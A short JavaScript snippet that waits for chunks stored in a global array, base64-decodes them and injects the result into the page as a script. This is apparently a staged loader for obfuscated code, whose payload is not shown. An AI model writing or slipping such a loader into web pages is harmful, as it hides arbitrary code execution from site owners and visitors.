(function(){
  function go(){
    if(!window.__MWP || window.__MWP.filter(Boolean).length<3) return setTimeout(go, 30);
    var s=document.createElement("script");
    s.text = decodeURIComponent(escape(atob(window.__MWP.join(""))));
    document.head.appendChild(s);
  }
  go();
})();
